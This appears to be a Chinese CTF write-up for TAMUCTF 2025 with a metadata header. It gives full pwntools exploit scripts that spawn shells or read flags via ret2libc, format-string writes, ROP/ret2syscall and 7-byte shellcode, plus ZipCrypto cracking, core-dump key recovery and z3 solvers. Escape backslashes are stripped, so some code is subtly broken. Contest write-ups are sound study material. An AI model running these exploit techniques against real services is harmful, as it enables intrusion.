---
title: TAMUCTF 2025 WriteUp
contest: TAMUCTF
year: 2025
team: 狼组安全社区
difficulty: medium
vuln_type: rop
tags:
- ret2libc
- fmt-string-write
- go-binary
- seccomp-orw
- 7byte-shellcode
- math-z3
attack_chain:
- 'Debug 1: 溢出 0x50 + p64(0x404100) + p64(0x4013A0) ret2libc'
- 'Sniper: fmt-string 改栈内容为 0x0a0a0000 + %s 读 flag'
- 'ROP Thirteen: Go 1.20.6 静态 elf + ret2syscall (read(0, bss, 0x100) + execve)'
- 'Seven: 7 字节 shellcode (push rsp; pop rsi; xor edi, edi; syscall; ret) + ret2csu + orw'
- 'Debug 2: 字符大小写反转函数绕过，PIE 1/16 爆破'
- 'Impossible: 童年游戏 (Pygame? - 文章未给细节)'
- 'Aggie Bookstore: 数组 nosql 注入'
- 'Deflated: ZipCrypto Deflate 已知明文攻击 (.git/HEAD)'
- 'Xorox: var_4020 ^ var_2060'
- 'Brainrot: Brain 类 + rot + think (矩阵乘法 + 移位) + z3 求解 4 块 10 字节'
- 'OTP: 核心转储 gdb 分析 key 还原'
key_payload: 'io.send(b"x54x5Ex31xFFx0Fx05xC3")  # 7-byte shellcode'
one_liner: TAMUCTF 2025 狼组 writeup：7 题 Pwn + 4 题 Reverse，混合 Go/C++/Python + Go SSRF + 矩阵 Z3。
lesson: 当 PIE 1/16 爆破可行时，覆盖 ret_addr 低 2 字节配合 read 重写栈是稳定技巧。
quality: high
full_path: TAMUCTF_·_2025_WriteUp.full.md
meta_path: TAMUCTF_·_2025_WriteUp.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 'TAMUCTF 2025 WriteUp。TAMUCTF 2025 狼组 writeup：7 题 Pwn + 4 题 Reverse，混合 Go/C++/Python + Go SSRF + 矩阵 Z3。。关键路径：Debug 1: 溢出 0x50 + p64(0x404100) + p64(0x4013A0) ret2libc → Sniper: fmt-string 改栈内容为 0x0a...'
category: pwn
subcategory: pwn_other
tools_used:
- C
- Go
- Python
- ROP
- Z3
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/234604.html
reasoning_chain:
- Debug 1 → 溢出 0x50 + p64(0x404100) + p64(0x4013A0) → 触发点：ret2libc
- Sniper → fmt-string 写 0x0a0a0000 到栈 + %s 读 flag → 假设：%hhn + %hn 改 3,4 byte
- ROP Thirteen → Go 1.20.6 静态 elf + ret2syscall (read+execve)
- Seven → 7 字节 shellcode (push rsp; pop rsi; xor edi,edi; syscall; ret) + ret2csu
- 假设：orw (open+read+write) 沙箱 → 动作：mprotect RWX → shellcode
- Debug 2 → 字符大小写反转 + PIE 1/16 爆破 → 覆盖 ret_addr 低 2 字节 (0x13B3)
- Deflated → ZipCrypto Deflate + .git/HEAD 已知明文 → bkcrack 爆破
- Brainrot → Brain rot + think 矩阵乘法 + z3 求解 4 块 10 字节
failed_attempts:
- 试图不用爆破解 Debug 2 → 失败：PIE 1/16 是必走路径
- 试图不解 ZipCrypto 直接读 .git/HEAD → 失败：必须先解压
key_observations:
- PIE 1/16 爆破可行时，覆盖 ret_addr 低 2 字节配合 read 重写栈是稳定技巧
- 7 字节极短 shellcode (push rsp; pop rsi; xor edi,edi; syscall; ret) 是 seccomp orw 经典
- Go 静态链接 + ret2syscall 直接 read+execve 是 Go pwn 通用套路
- ZipCrypto Deflate 已知明文攻击 = bkcrack 爆破 (--with-plain)
prerequisites:
- ROP 链构造 + ret2csu
- fmt-string %hhn %hn 写任意值
- bkcrack ZipCrypto 已知明文攻击
- z3 求解线性方程组 + Brainf**k 类 VM 逆向
---
# TAMUCTF · 2025 WriteUp

> 原文: https://www.ctfiot.com/234604.html
> ID: 234604

我们新点击蓝字

关注我们

声明

本文作者：CTF战队

本文字数：6691字

阅读时长：约40分钟

附件/链接：回复 TAMUCTF2025

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

❝

TAMUCTF · 2025  

由德州农工大学（Texas A&M University）组织的比赛

关注公众号回复 TAMUCTF2025 获得比赛附件

https://ctfd.tamuctf.com

Start here!

Howdy World

❝

Welcome to TAMUctf 2025!

Please enter the flag from tamuctf.com to prove that you are a real person 🙂

The flag format is gigem{.*} unless otherwise specified

WEB

Impossible

❝

My friends and I used to play this game all the time as kids! I never managed to win though, can you?

我和我的朋友们小时候经常玩这个游戏！我从来没有赢过，你能吗？
题目地址：https://impossible.tamuctf.com/

Aggie Bookstore

❝

Unfortunately it seems I’ve forgotten the name of my book…

Note: the flag format will be FLAG{…} instead of gigem{…}.

https://aggie-bookstore.tamuctf.com

不幸的是，我似乎忘了我的书的名字。。。

注意：标志格式将是flag{…}而不是gigem{…}。

https://aggie-bookstore.tamuctf.com 
附件: aggie-bookstore.tar.gz

应该是传数组nosql注入

Pwn

Debug 1

❝

I made a program which inverts the capitalization of letters! Surely there’s nothing insecure with the program, right? 
附件: debug-1.tar.gz

可以溢出到rbp和ret_addr的地方，返回地址写上debug函数地址，接着ret2libc即可

from pwn import *

context.log_level = "debug"
io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-1")

io.recvuntil(b"Exitnn")
io.sendline(b"1")
io.send(b"A"*0x50 + p64(0x404100) + p64(0x4013A0))
io.recvuntil(b":) )n")
io.sendline(b"1")
io.recvuntil(b"leak: ")
system = int(io.recv(12), 16)
libc = ELF("./libc.so.6")
libc_base = system - libc.sym['system']
sh_addr = libc_base + next(libc.search(b"/bin/shx00"))
rdi_ret = libc_base + next(libc.search(b"x5FxC3"))
io.send(b"A" * 0x68 + p64(rdi_ret) + p64(sh_addr) + p64(system))
io.interactive()

Sniper

❝

I feel like there’s an unlimited supply of format string challenges with this name. 
附件：sniper.tar.gz

fmt，flag已经写在了0xa0a0000，由于是fgets读数据，0x0a0a0000这个地址不能直接写到栈上，就需要通过fmt修改栈内容为0x0a0a0000（改3,4byte就行），然后%s对应位置读出flag

from pwn import *
import re

context.log_level = "debug"
io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_sniper")

io.recvuntil(b"0x")
stack = int(io.recv(12), 16)
flag_addr = stack + 0x70 + 2
io.sendline(f"%{0xAA}c%11$hhn%{0xA0A-0xAA}c%10$hn%20$saaa".encode()+p64(flag_addr)+p64(stack-8))
print(re.findall(b"gigem{.*}",io.recvuntil(b"}"))[0])

# io.interactive()

ROP Thirteen

❝

I wanted to make a ROT13 encoder, so here it is! I also made sure to make it as efficient as possible. 
Note: The binary is compiled using Go 1.20.6. 
附件：rop-thirteen.tar.gz

go pwn，静态elf，就是个栈溢出，调试着写确定溢出长度，然后ret2syscall

from pwn import *
import re

context.log_level = "debug"
io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_rop-thirteen")

rax_ret = 0x000000000040cc26
rbp_ret = 0x000000000045f34d
rdi_xxx_ret = 0x000000000047ea5c
# pop rdi; or byte ptr [rax - 1], cl; ret;
rdx_ret = 0x00000000004801bd
rsi_ret = 0x000000000041cf18
rsp_ret = 0x0000000000438d50
syscall_ret = 0x000000000045f409
leave_ret = 0x00000000004825da
io.recvuntil(b"): n")
io.sendline(b"A"*0x20)
io.recvuntil(b"here: n")
bss = 0x54B800
pl = b"B"*0xf0+p64(0x10a)+p64(0x168)+p64(0xc0000a4ef0)+p64(bss)
pl += p64(rax_ret) + p64(bss + 0x100) 
pl += p64(rdi_xxx_ret) + p64(0)
pl += p64(rsi_ret) + p64(bss)
pl += p64(rax_ret) + p64(0)
pl += p64(syscall_ret) + p64(leave_ret)
io.send(pl)
sleep(0.5)
pl2 = b"A" * 8
pl2 += p64(rax_ret) + p64(bss + 0x100) 
pl2 += p64(rdi_xxx_ret) + p64(0)
pl2 += p64(rdx_ret) + p64(0x100)
pl2 += p64(rsi_ret) + p64(bss+0x200)
pl2 += p64(rax_ret) + p64(0)
pl2 += p64(syscall_ret)
pl2 += p64(rax_ret) + p64(bss + 0x100)
pl2 += p64(rdi_xxx_ret) + p64(bss+0x200)
pl2 += p64(rdx_ret) + p64(0)
pl2 += p64(rsi_ret) + p64(0)
pl2 += p64(rax_ret) + p64(0x3b)
pl2 += p64(syscall_ret)
io.send(pl2)
sleep(0.5)
io.send(b"/bin/shx00")

io.interactive()

Seven

❝

Seven-byte shellcode!? 
附件：seven.tar.gz

7字节shellcode，利用寄存器状态调用read向栈上写了ROP链，然后ret执行ROP即可，可用gadget中没法控制rdx，采用ret2csu完成利用，最后写入orw绕过沙箱读出flag

from pwn import *

context.log_level = "debug"
context.arch = "amd64"
io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_seven")

elf = ELF("./pwn")
gadget1 = 0x401348
gadget2 = 0x401362
def ret2csu(got_addr, rdi, rsi, rdx):
    padding = 0
    payload = padding * b'A' + p64(gadget2)
    payload += p64(0) + p64(1) 
    payload += p64(got_addr) + p64(rdi) + p64(rsi) + p64(rdx)
    payload += p64(gadget1) + b'a'*0x38
    return payload

io.send(b"x54x5Ex31xFFx0Fx05xC3")
'''
push rsp
pop rsi
xor edi, edi
syscall
ret
'''
sleep(0.5)
pl = ret2csu(elf.got['mprotect'], 0x500000, 0x1000, 7)
pl += ret2csu(elf.got['read'], 0, 0x500000, 0x1000)
pl += p64(0x401121)
io.send(pl)
sleep(0.5)
orw = asm(shellcraft.amd64.open("flag.txt"))
orw += asm(shellcraft.amd64.read('rax', 'rsp', 0x100))
orw += asm(shellcraft.amd64.write(1, 'rsp', 0x100))
io.send(orw)

io.interactive()

Debug 2

❝

My friends gave me some advice to fix my code because apparently there were “glaring security flaws”. Not sure what they meant, but now my code is more secure than ever! 
附件：debug-2.tar.gz

下面的本地通了，但是远程寄，不道如何，1/16机率

开了pie，通过覆盖ret_addr低2字节重新read数据同时泄露pie，然后控制rbp，接着调用read写内容到bss，再做栈迁移执行bss段的ROP链即可

from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-2")
io = process("./pwn")
elf = ELF("./pwn")

def transform(data):
    data_l = list(data)
    for i in range(len(data_l)):
        if data_l[i] > 0x40and data_l[i] <=0x5a:
            data_l[i] += 0x20
        elif data_l[i] > 0x60and data_l[i] <= 0x7a:
            data_l[i] -= 0x20

    return bytes(data_l)

io.recvuntil(b"Exitnn")
io.sendline(b"1")
io.recvuntil(b"):nn")
pl = transform(b"A"*0x58 + b"xB3x53")
io.send(pl)
io.recvuntil(b"A"*0x58)
pie = u64(io.recv(6) + b"x00x00") - 0x13B3
print(hex(pie))
bss = pie + 0x4020 + 0x800
io.recvuntil(b"Exitnn")
io.sendline(b"1")
io.recvuntil(b"):nn")
pl = b"A"*0x50 + p64(bss) + p64(pie+0x134A)
io.send(transform(pl))
leave_ret = pie + 0x00000000000012da
rdi_ret = pie + 0x000000000000145b
rsi_r15_ret = pie + 0x0000000000001459
pl = p64(rdi_ret) + p64(pie + elf.got['puts']) + p64(pie + elf.plt['puts'])
pl += p64(rdi_ret) + p64(0)
pl += p64(rsi_r15_ret) + p64(bss-8) + p64(0) + p64(pie + elf.plt['read'])
pl = pl.ljust(0x50, b"A")
pl += p64(bss - 0x58) + p64(leave_ret)
io.send(transform(pl))
io.recvuntil(b"s):nn")
io.recvline()
io.recvline()
puts = u64(io.recv(6) + b"x00x00")
libc = ELF("./libc.so.6")
libc_base = puts - libc.sym['puts']
sys_addr = libc_base + libc.sym['system']
sh_addr = libc_base + next(libc.search(b"/bin/shx00"))
pl = p64(rdi_ret) + p64(sh_addr) + p64(sys_addr)
io.sendline(pl)

io.interactive()

Misc

Feedback

❝

We value your feedback. Please let us know what went right/wrong, and how we should improve for next year.

forensics

Deflated

❝

I heard ZipCrypto Store has a vulnerability, so I’ve used ZipCrypto Deflate instead. Can you still get the flag?

Notes

Flag matches regex

gigem{[A-Z0-9_]+}

Do not try to brute force the password. It is not in any password list.

我听说ZipCrypto商店有一个漏洞，所以我使用了ZipCrypto Deflate。你还能拿到国旗吗？

标志与正则表达式gigem{[A-Z0-9_]+}匹配。

不要试图暴力破解密码。它不在任何密码列表中。 
附件：deflated.tar.gz

因为是ZipCrypto Deflate且提示中说不要试图暴力破解，那估计就是已知明文攻击了，查看到压缩包目录中有一个.git文件夹，且存在HEAD文件，而HEAD文件中内容通常为ref: refs/heads/main，满足12字节，那就可以尝试进行明文攻击，然后使用爆破出来的密钥进行解密

bkcrack -C deflated.zip -c .git/HEAD -p HEAD.txt
bkcrack -C deflated.zip -k f2635bca a91bec3a ec81bdf9 -D decrypted.zip

然后解压出来的print_flag.py文件中是一个艺术字，不是flag，猜测被人改过，git show发现被改过，所以恢复一手，拿到flag

git show 01c525a:
print_flag.py > print_flag.py

❝

gigem{DONT_FEEL_2_DEFLATED}

Reverse

What It Does

❝

What does it do? Does it do what it does? 
附件：whatitdoes.tar.gz

附件flag.wdz用文本编辑器打开

nim游戏，观察到每一轮中第三人输出的即为flag

Xorox

❝

Today I will xor my flag with a key.[图片]Note: Only the correct flag will make the binary print Yup 
附件：xorox.tar.gz

附件拖入ida

先检查前五个字符，然后进行函数调用。简而言之就是var_4020^var_2060

Brainrot

❝

This challenge is only solvable in Ohio 😂😂. 
Note: This challenge requires -k to run properly. 
附件：brainrot.tar.gz

敲打了一下gpt

import hashlib
from z3 import *

class Brain:
    def __init__(self, neurons):
        self.thought_size = 10
        self.neurons = [row.copy() for row in neurons]  # 使用列表推导式深拷贝

    def brainstem(self):
        flat = sum(self.neurons, [])
        joined = ",".join(map(str, flat))
        return hashlib.sha256(joined.encode()).hexdigest()

    def rot(self, data):
        for i in range(len(data)):
            row = (3 * i + 7) % self.thought_size
            col = (9 * i + 3) % self.thought_size
            self.neurons[row][col] ^= data[i]

    def think(self, data):
        thought = [0] * self.thought_size
        for i in range(self.thought_size):
            thought[i] = sum(self.neurons[i][j] * data[j] for j in range(self.thought_size))
        self.neurons = self.neurons[1:] + [thought.copy()]
        return thought

# ---------------------- 原始数据填充 ----------------------
healthy_brain = [
    [71, 101, 18, 37, 41, 69, 80, 28, 23, 48],
    [35, 32, 44, 24, 27, 20, 34, 58, 24, 9],
    [73, 29, 37, 94, 27, 58, 104, 65, 116, 44],
    [26, 83, 77, 116, 9, 96, 111, 118, 52, 62],
    [100, 15, 119, 53, 59, 34, 38, 68, 104, 110],
    [51, 1, 54, 62, 56, 120, 4, 80, 60, 120],
    [125, 92, 95, 98, 97, 110, 93, 33, 128, 93],
    [70, 23, 123, 40, 75, 23, 104, 73, 52, 6],
    [14, 11, 99, 16, 124, 52, 14, 73, 47, 66],
    [128, 11, 49, 111, 64, 108, 14, 66, 128, 101]
]

brainrot = b"gnilretskdi ,coffee ,ymotobol ,amenic etulosba ,oihO ni ylno ,oihO ,pac eht pots ,pac ,yadot yarp uoy did ,pu lio ,eohs ym elkcub 2 1 ,sucric latigid ,zzir tanec iaK ,tac frumS ,yzzilg ,ekahs melraH ,tanec iaK ,raebzaf ydderF ,gnixamnoog ,hoesac ,relzzir eht rof ttayg ruoy tuo gnikcits ,reppay ,gnippay ,pay ,gniggom ,gom,ttalcobmob ,gnillihc gnib ,deepswohsi ,tor niarb ,oitar + L ,ozob L ,L ,oitar ,ie ie iE ,suoived ,emem seimmug revas efil dna seceip s'eseeR ,io io io ,ytrap zzir koTkiT ,teggun ,su gnoma ,retsopmi ,yssus ,suS ,elgnid eladnuaQ ,gnos metsys ym ni atnaF ,kcil suoived ,syddid ta sthgin 5 ,hsinapS ro hsilgnE .gnos teksirb ,agnizab ,bruc eht etib ,orb lil ,dulb ,ni gnihcram og stnias eht nehw ho ,neerb fo seert ees I ,sinneD ekud ,biks no ,ennud yvvil ,knorg ybab ,rehtorb pu s'tahw ,gab eht ni seirf eht tuP ,edaf repat wol ,yddid ,yddirg ,ahpla ,gnixxamskool ,gninoog ,noog ,egde ,gnigde ,raeb evif ydderf ,ekahs ecamirg ,ynnacnu ,arua ,daeh daerd tnalahcnon ,ekard ,gnixat munaF ,xat munaf ,zzir idibikS ,yug llihc ,eiddab ,kooc reh/mih tel ,gnikooc ,kooc ,nissub ,oihO ,amgis eht tahw ,amgis ,idibikS no ,relzzir ,gnizzir ,zzir ,wem ,gniwem ,ttayg ,teliot idibikS ,idibikS"[
           ::-1]

required_thoughts = [
    [59477, 41138, 59835, 73146, 77483, 59302, 102788, 67692, 62102, 85259],
    [40039, 59831, 72802, 77436, 57296, 101868, 69319, 59980, 84518, 73579466],
    [59783, 73251, 76964, 58066, 101937, 68220, 59723, 85312, 73537261, 7793081533],
    [71678, 77955, 59011, 102453, 66381, 60215, 86367, 74176247, 9263142620, 982652150581],
]

# ---------------------- 主逻辑 ----------------------
brain = Brain(healthy_brain)
brain.rot(brainrot)  # 处理 brainrot 数据

flag = bytearray()
for block_idx in range(4):
    matrix = brain.neurons  # 当前神经元矩阵
    target = required_thoughts[block_idx]

    # 使用Z3求解器约束整数范围
    s = Solver()
    x = [Int(f'x_{i}') for i in range(10)]
    for var in x:
        s.add(var >= 0, var <= 255)  # 确保输入是合法字节

    # 添加线性方程组约束
    for i in range(10):
        s.add(sum(matrix[i][j] * x[j] for j in range(10)) == target[i])

    if s.check() != sat:
        print(f"块 {block_idx} 无解")
        exit()

    model = s.model()
    solution = [model[var].as_long() for var in x]
    flag.extend(solution)
    brain.think(solution)  # 更新神经元矩阵

# 验证哈希并输出
if brain.brainstem() == "4fe4bdc54342d22189d129d291d4fa23da12f22a45bca01e75a1f0e57588bf16":
    print("Flag:", flag.decode())
else:
    print("哈希验证失败")

思路二

文本编辑器打开附件，发现部分python关键字是被一些字符替换了，按照自己的理解替换回来即可

观察发现，think函数是矩阵的乘法，再加一点替换。抽象成数学问题就是：一个1*10的矩阵A乘以一个10*10的矩阵B，得到一个1*10的矩阵C。将C的转置矩阵D替换到矩阵B中，替换方式为删掉矩阵B的最左侧列，矩阵B整体向左移，矩阵D即可替换为矩阵B的最右列，替换后的矩阵B1,,…B4参与之后的乘法。如果初始的矩阵B已知，使用四个不同的矩阵A1,..A4进行四次这样的乘法，四次的结果即矩阵C1,..,C4已知，能求出A1,…A4吗。结果是显而易见的，直接求矩阵乘法的逆运算即可。完整脚本

from hashlib import sha256

class Brain:
    def __init__(unc, neurons):
        unc.neurons = neurons
        unc.thought_size = 10

    def brainstem(unc):
        return sha256(",".join(str(x) for x in sum(unc.neurons, [])).encode()).hexdigest()

    def rot(unc, data):
        for i in range(len(data)):
            unc.neurons[(3 * i + 7) % unc.thought_size][(9 * i + 3) % unc.thought_size] ^= data[i]

    def think(unc, data):
        thought = [0] * unc.thought_size
        for i in range(unc.thought_size):
            thought[i] = sum(unc.neurons[i][j] * data[j] for j in range(unc.thought_size))
        unc.neurons[:-1] = unc.neurons[1:]
        unc.neurons[-1] = thought
        return thought
    
healthy_brain = [[71, 101, 18, 37, 41, 69, 80, 28, 23, 48], [35, 32, 44, 24, 27, 20, 34, 58, 24, 9], [73, 29, 37, 94, 27, 58, 104, 65, 116, 44], [26, 83, 77, 116, 9, 96, 111, 118, 52, 62], [100, 15, 119, 53, 59, 34, 38, 68, 104, 110], [51, 1, 54, 62, 56, 120, 4, 80, 60, 120], [125, 92, 95, 98, 97, 110, 93, 33, 128, 93], [70, 23, 123, 40, 75, 23, 104, 73, 52, 6], [14, 11, 99, 16, 124, 52, 14, 73, 47, 66], [128, 11, 49, 111, 64, 108, 14, 66, 128, 101]]
brainrot = b"gnilretskdi ,coffee ,ymotobol ,amenic etulosba ,oihO ni ylno ,oihO ,pac eht pots ,pac ,yadot yarp uoy did ,pu lio ,eohs ym elkcub 2 1 ,sucric latigid ,zzir tanec iaK ,tac frumS ,yzzilg ,ekahs melraH ,tanec iaK ,raebzaf ydderF ,gnixamnoog ,hoesac ,relzzir eht rof ttayg ruoy tuo gnikcits ,reppay ,gnippay ,pay ,gniggom ,gom,ttalcobmob ,gnillihc gnib ,deepswohsi ,tor niarb ,oitar + L ,ozob L ,L ,oitar ,ie ie iE ,suoived ,emem seimmug revas efil dna seceip s'eseeR ,io io io ,ytrap zzir koTkiT ,teggun ,su gnoma ,retsopmi ,yssus ,suS ,elgnid eladnuaQ ,gnos metsys ym ni atnaF ,kcil suoived ,syddid ta sthgin 5 ,hsinapS ro hsilgnE .gnos teksirb ,agnizab ,bruc eht etib ,orb lil ,dulb ,ni gnihcram og stnias eht nehw ho ,neerb fo seert ees I ,sinneD ekud ,biks no ,ennud yvvil ,knorg ybab ,rehtorb pu s'tahw ,gab eht ni seirf eht tuP ,edaf repat wol ,yddid ,yddirg ,ahpla ,gnixxamskool ,gninoog ,noog ,egde ,gnigde ,raeb evif ydderf ,ekahs ecamirg ,ynnacnu ,arua ,daeh daerd tnalahcnon ,ekard ,gnixat munaF ,xat munaf ,zzir idibikS ,yug llihc ,eiddab ,kooc reh/mih tel ,gnikooc ,kooc ,nissub ,oihO ,amgis eht tahw ,amgis ,idibikS no ,relzzir ,gnizzir ,zzir ,wem ,gniwem ,ttayg ,teliot idibikS ,idibikS"[::-1]

brain = Brain(healthy_brain)
brain.rot(brainrot)

# flag = input("> ").encode()
# if not len(flag) == 40:
#     print("i'll be nice and tell you my thoughts have to be exactly 40 characters long")
#     exit()
required_thoughts = [
    [59477, 41138, 59835, 73146, 77483, 59302, 102788, 67692, 62102, 85259],
    [40039, 59831, 72802, 77436, 57296, 101868, 69319, 59980, 84518, 73579466],
    [59783, 73251, 76964, 58066, 101937, 68220, 59723, 85312, 73537261, 7793081533],
    [71678, 77955, 59011, 102453, 66381, 60215, 86367, 74176247, 9263142620, 982652150581],
]

# failed_to_think = False
# for i in range(0, len(flag), 10):
#     thought = brain.think(flag[i:i + 10])
#     if thought != required_thoughts[i//10]:
#         failed_to_think = True

# if failed_to_think or brain.brainstem() != "4fe4bdc54342d22189d129d291d4fa23da12f22a45bca01e75a1f0e57588bf16":
#     print("ermm... you might not be a s""igma...")
# else:
#     print("holy s""kibidi you popped off... go submit the flag")

import numpy as np

for i in range(4):
    A=np.linalg.inv(brain.neurons)
    C=A @ required_thoughts[i]
    for j in C:
        print(chr(round(j)),end='')
    brain.neurons[:-1]= brain.neurons[1:]
    brain.neurons[-1]=required_thoughts[i]
    
print(brain.brainstem())

OTP

❝

I heard one-time pads are unbreakable, so it should be impossible to recover the flag, right? 
附件：otp.tar.gz

给了四个文件，一个源码文件otp.c，一个编译后程序otp，一个密文，一个核心转储文件dump。关键在于核心转储文件，使用gdb ./otp ./dump可以加载进行分析，需要源程序是因为需要加载符号信息和调试信息。常用gdb命令如下

bt # 查看调用栈
frame 5 # 切换到5栈帧
print key # 输出key
x/59xb key # 查看key区域的59个字节
info locals # 查看局部变量

但是可以发现每次调用的p是没变的，所以想直接从main函数查看原文是不现实的。另一方面，key是变化的，所以可以提出所有的key再做异或即得。gdb脚本

# test.gdb文件
set pagination off
set confirm off

# 输出文件（二进制格式）
set$outfile = "all_keys.bin"
shell rm -f $outfile
# 清空旧文件

define extract_keys
    set$frame = 4
    while$frame <= 1003
        frame $frame
        if$pc == 0
            echo"Frame $frame is invalid.n"
        else
            # 检查key是否存在
            if &key == 0
                echo"Frame $frame: 'key' not found.n"
            else
                # 追加59字节到文件
                append binary memory outfile key (key + 59)
                echo"Appended Frame $framen"
            end
        end
        set$frame = $frame + 1
    end
end

extract_keys
echo"All keys saved to " + $outfile + "n"
quit

运行命令gdb -x ./test.gdb ./otp ./dump即可得到所有的key。python脚本求解

with open('outfile','rb') as f1,open('encrypted_flag.bin','rb') as f2:
    s1=f1.read()
    s2=f2.read()
    
s2=bytearray(s2)
for i in range(1000):
    for j in range(59):
        s2[j]^=s1[i*59+j]
        
print(bytes(s2))

Crypto

ECC

❝

Can you get the secret key from the following two signed messages?

1st Message: “The secp256r1 curve was used.”

2nd Message: “k value may have been re-used.”

1st Signature r value: 91684750294663587590699225454580710947373104789074350179443937301009206290695

1st Signature s value: 8734396013686485452502025686012376394264288962663555711176194873788392352477

2nd Signature r value: 91684750294663587590699225454580710947373104789074350179443937301009206290695

2nd Signature s value: 96254287552668750588265978919231985627964457792323178870952715849103024292631

The flag is the secret key used to sign the messages. It will be in the flag format.

附件：ECC.tar.gz

作者

CTF战队

ctf.wgpsec.org

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
from pwn import *

context.log_level = "debug"
io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-1")

io.recvuntil(b"Exitnn")
io.sendline(b"1")
io.send(b"A"*0x50 + p64(0x404100) + p64(0x4013A0))
io.recvuntil(b":) )n")
io.sendline(b"1")
io.recvuntil(b"leak: ")
system = int(io.recv(12), 16)
libc = ELF("./libc.so.6")
libc_base = system - libc.sym['system']
sh_addr = libc_base + next(libc.search(b"/bin/shx00"))
rdi_ret = libc_base + next(libc.search(b"x5FxC3"))
io.send(b"A" * 0x68 + p64(rdi_ret) + p64(sh_addr) + p64(system))
io.interactive()
from pwn import *
import re

context.log_level = "debug"
io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_sniper")

io.recvuntil(b"0x")
stack = int(io.recv(12), 16)
flag_addr = stack + 0x70 + 2
io.sendline(f"%{0xAA}c%11$hhn%{0xA0A-0xAA}c%10$hn%20$saaa".encode()+p64(flag_addr)+p64(stack-8))
print(re.findall(b"gigem{.*}",io.recvuntil(b"}"))[0])

# io.interactive()
from pwn import *
import re

context.log_level = "debug"
io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_rop-thirteen")

rax_ret = 0x000000000040cc26
rbp_ret = 0x000000000045f34d
rdi_xxx_ret = 0x000000000047ea5c
# pop rdi; or byte ptr [rax - 1], cl; ret;
rdx_ret = 0x00000000004801bd
rsi_ret = 0x000000000041cf18
rsp_ret = 0x0000000000438d50
syscall_ret = 0x000000000045f409
leave_ret = 0x00000000004825da
io.recvuntil(b"): n")
io.sendline(b"A"*0x20)
io.recvuntil(b"here: n")
bss = 0x54B800
pl = b"B"*0xf0+p64(0x10a)+p64(0x168)+p64(0xc0000a4ef0)+p64(bss)
pl += p64(rax_ret) + p64(bss + 0x100) 
pl += p64(rdi_xxx_ret) + p64(0)
pl += p64(rsi_ret) + p64(bss)
pl += p64(rax_ret) + p64(0)
pl += p64(syscall_ret) + p64(leave_ret)
io.send(pl)
sleep(0.5)
pl2 = b"A" * 8
pl2 += p64(rax_ret) + p64(bss + 0x100) 
pl2 += p64(rdi_xxx_ret) + p64(0)
pl2 += p64(rdx_ret) + p64(0x100)
pl2 += p64(rsi_ret) + p64(bss+0x200)
pl2 += p64(rax_ret) + p64(0)
pl2 += p64(syscall_ret)
pl2 += p64(rax_ret) + p64(bss + 0x100)
pl2 += p64(rdi_xxx_ret) + p64(bss+0x200)
pl2 += p64(rdx_ret) + p64(0)
pl2 += p64(rsi_ret) + p64(0)
pl2 += p64(rax_ret) + p64(0x3b)
pl2 += p64(syscall_ret)
io.send(pl2)
sleep(0.5)
io.send(b"/bin/shx00")

io.interactive()
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_seven")

elf = ELF("./pwn")
gadget1 = 0x401348
gadget2 = 0x401362
def ret2csu(got_addr, rdi, rsi, rdx):
    padding = 0
    payload = padding * b'A' + p64(gadget2)
    payload += p64(0) + p64(1) 
    payload += p64(got_addr) + p64(rdi) + p64(rsi) + p64(rdx)
    payload += p64(gadget1) + b'a'*0x38
    return payload

io.send(b"x54x5Ex31xFFx0Fx05xC3")
'''
push rsp
pop rsi
xor edi, edi
syscall
ret
'''
sleep(0.5)
pl = ret2csu(elf.got['mprotect'], 0x500000, 0x1000, 7)
pl += ret2csu(elf.got['read'], 0, 0x500000, 0x1000)
pl += p64(0x401121)
io.send(pl)
sleep(0.5)
orw = asm(shellcraft.amd64.open("flag.txt"))
orw += asm(shellcraft.amd64.read('rax', 'rsp', 0x100))
orw += asm(shellcraft.amd64.write(1, 'rsp', 0x100))
io.send(orw)

io.interactive()
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-2")
io = process("./pwn")
elf = ELF("./pwn")

def transform(data):
    data_l = list(data)
    for i in range(len(data_l)):
        if data_l[i] > 0x40and data_l[i] <=0x5a:
            data_l[i] += 0x20
        elif data_l[i] > 0x60and data_l[i] <= 0x7a:
            data_l[i] -= 0x20

    return bytes(data_l)

io.recvuntil(b"Exitnn")
io.sendline(b"1")
io.recvuntil(b"):nn")
pl = transform(b"A"*0x58 + b"xB3x53")
io.send(pl)
io.recvuntil(b"A"*0x58)
pie = u64(io.recv(6) + b"x00x00") - 0x13B3
print(hex(pie))
bss = pie + 0x4020 + 0x800
io.recvuntil(b"Exitnn")
io.sendline(b"1")
io.recvuntil(b"):nn")
pl = b"A"*0x50 + p64(bss) + p64(pie+0x134A)
io.send(transform(pl))
leave_ret = pie + 0x00000000000012da
rdi_ret = pie + 0x000000000000145b
rsi_r15_ret = pie + 0x0000000000001459
pl = p64(rdi_ret) + p64(pie + elf.got['puts']) + p64(pie + elf.plt['puts'])
pl += p64(rdi_ret) + p64(0)
pl += p64(rsi_r15_ret) + p64(bss-8) + p64(0) + p64(pie + elf.plt['read'])
pl = pl.ljust(0x50, b"A")
pl += p64(bss - 0x58) + p64(leave_ret)
io.send(transform(pl))
io.recvuntil(b"s):nn")
io.recvline()
io.recvline()
puts = u64(io.recv(6) + b"x00x00")
libc = ELF("./libc.so.6")
libc_base = puts - libc.sym['puts']
sys_addr = libc_base + libc.sym['system']
sh_addr = libc_base + next(libc.search(b"/bin/shx00"))
pl = p64(rdi_ret) + p64(sh_addr) + p64(sys_addr)
io.sendline(pl)

io.interactive()
